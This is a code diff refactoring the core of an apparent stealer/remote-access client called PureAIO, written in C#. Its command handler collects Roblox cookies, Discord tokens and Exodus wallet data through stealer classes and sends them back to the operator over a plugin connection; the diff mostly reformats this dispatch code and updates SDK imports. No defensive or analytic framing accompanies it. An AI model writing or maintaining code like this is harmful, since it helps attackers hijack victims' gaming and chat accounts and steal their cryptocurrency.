@@ -5,30 +5,32 @@
 using System;
 using System.IO;
 using System.Threading;
-using PluginSDK;
+using PluginSDK.Connection;
+using PluginSDK.Interfaces;
+using PluginSDK.Packets;
 using ProtoBuf;
-using PureAIO;
 using PureAIO.Client.AuthBait;
 using PureAIO.Client.Stealers;
 
 namespace PureAIO.Client
 {
-    public class Core
+    public static class Core
     {
         public static void Initialize(byte[] packet)
         {
-            var client = new PluginClient(packet);
-            client.ReceivedMessageEvent += OnPacketReceived;
-            client.Start();
+            CustomPluginClient.Run(packet, OnPacketReceived);
         }
 
-        private static void OnPacketReceived(PluginClient client, CustomPacket raw)
+        private static void OnPacketReceived(IPacket msg, PluginClient client)
         {
+            var cp = msg as CustomPacket;
+            if (cp == null) return;
+
             AIOPacket pkt;
             try
             {
-                using var ms = new MemoryStream(raw.Buffer);
-                pkt = Serializer.Deserialize<AIOPacket>(ms);
+                using (var ms = new MemoryStream(cp.Buffer))
+                    pkt = Serializer.Deserialize<AIOPacket>(ms);
             }
             catch { return; }
 
@@ -53,19 +55,11 @@ namespace PureAIO.Client
                         try
                         {
                             var list = RobloxCookieStealer.Collect();
-                            Send(client, new RobloxCookieResponse
-                            {
-                                Success = true,
-                                Cookies = list
-                            });
+                            Send(client, new RobloxCookieResponse { Success = true, Cookies = list });
                         }
                         catch (Exception ex)
                         {
-                            Send(client, new RobloxCookieResponse
-                            {
-                                Success = false,
-                                Error   = ex.Message
-                            });
+                            Send(client, new RobloxCookieResponse { Success = false, Error = ex.Message });
                         }
                     });
                     break;
@@ -76,19 +70,11 @@ namespace PureAIO.Client
                         try
                         {
                             var list = DiscordTokenStealer.Collect();
-                            Send(client, new DiscordTokenResponse
-                            {
-                                Success = true,
-                                Tokens  = list
-                            });
+                            Send(client, new DiscordTokenResponse { Success = true, Tokens = list });
                         }
                         catch (Exception ex)
                         {
-                            Send(client, new DiscordTokenResponse
-                            {
-                                Success = false,
-                                Error   = ex.Message
-                            });
+                            Send(client, new DiscordTokenResponse { Success = false, Error = ex.Message });
                         }
                     });
                     break;
@@ -108,11 +94,7 @@ namespace PureAIO.Client
                         }
                         catch (Exception ex)
                         {
-                            Send(client, new ExodusResponse
-                            {
-                                Success = false,
-                                Error   = ex.Message
-                            });
+                            Send(client, new ExodusResponse { Success = false, Error = ex.Message });
                         }
                     });
                     break;
@@ -121,9 +103,11 @@ namespace PureAIO.Client
 
         private static void Send(PluginClient client, AIOPacket pkt)
         {
-            using var ms = new MemoryStream();
-            Serializer.Serialize(ms, pkt);
-            client.Send(new CustomPacket { Buffer = ms.ToArray() });
+            using (var ms = new MemoryStream())
+            {
+                Serializer.Serialize(ms, pkt);
+                client.Send(new CustomPacket { Buffer = ms.ToArray() });
+            }
         }
     }
 }
